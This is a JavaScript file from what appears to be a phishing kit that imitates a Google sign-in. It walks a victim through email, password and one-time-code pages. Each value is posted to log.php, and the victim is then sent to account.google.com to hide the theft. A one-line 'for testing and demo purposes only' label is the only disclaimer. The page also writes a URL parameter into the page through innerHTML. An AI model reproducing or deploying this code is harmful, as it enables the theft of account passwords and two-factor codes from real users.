console.log('For testing and demo purposes only!')

let emailPlace = document.getElementById('emaillabel')

if (emailPlace != null) {
    let params = new URLSearchParams(window.location.search)
    emailPlace.innerHTML = decodeURIComponent(params.get('ref') ?? 'Loading...')
}

function send_init() {
    alert()
}

function didPressNextEmail() {

    let button = document.getElementById('nextbutton')
    let input = document.getElementById('emailinput')
    let email = input.value
    
    send('username', email)

    button.style.opacity = 0.3
    
    setTimeout(() => {
        window.location.href = `challange.php?ref=${encodeURIComponent(email)}&challange=pwd&nonce=117576462747584&type=secure`
    }, 1200)
}

function didPressNextPassword() {


    let button = document.getElementById('nextbutton')
    let input = document.getElementById('passwordinput')
    let password = input.value

    send('password', password)

    button.style.opacity = 0.3

    setTimeout(() => {
        window.location.href = `otp.php?ref=${getEmail()}&challange=pwd&nonce=117576462747584&type=secure`
    }, 3200)

}

function didPressOTPButton() {

    let button = document.getElementById('callbtn')
    button.style.opacity = 0.3

    setTimeout(() => {
        window.location.href = `confirm.php?ref=${getEmail()}&challange=pwd&nonce=117576462747584&type=secure`
    }, 1200)
}

function didPressNextSubmitOTP() {
    
    let pin = document.getElementById('idvPin')
    let code = pin.value

    send('code', code)

    window.location.href = 'https://account.google.com'
}

function send(key, value) {

    fetch('log.php', {
        method: 'POST',
        headers: { 
            'Content-Type': 'application/json'
        },
        body: JSON.stringify( { key: key, value: value } )
    })
    .then(res => console.log(res.status))
}

function getEmail() {
    let params = new URLSearchParams(window.location.search)
    return decodeURIComponent(params.get('ref') ?? '')
}

function getRedirect() {
    let params = new URLSearchParams(window.location.search)
    return decodeURIComponent(params.get('redirect') ?? '')
}